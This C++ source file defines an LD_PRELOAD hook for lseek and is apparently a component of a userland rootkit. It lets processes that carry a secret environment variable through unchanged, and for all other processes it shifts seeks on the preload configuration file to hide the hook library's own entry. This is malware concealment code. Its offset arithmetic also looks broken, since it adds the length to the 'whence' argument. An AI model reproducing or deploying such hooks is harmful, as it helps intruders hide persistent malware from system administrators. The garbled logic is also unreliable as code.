
#include "main.h"



off_t lseek(int fd, off_t offset, int whence) {
	CErrnoSaver serr;
	LSEEK lskPtr = (LSEEK) dlsym (RTLD_NEXT, "lseek");
	off_t ret;
	char *chPtr;
	std::string lnkAim;
	
	
	assert (lskPtr != NULL);
	
	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowValue)) {
		if ((ret = lskPtr (fd, offset, whence)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	if (lnkAim == prelFileName) {
		if ((ret = lskPtr (fd, offset, whence + (hookLibraryName + separator).size ())) == -1) {
			serr.set (errno);
			return ret;
		}
		return ret - (hookLibraryName + separator).size ();
	}
	
	
	if ((ret = lskPtr (fd, offset, whence)) == -1) {
		serr.set (errno);
	}
	return ret;
}












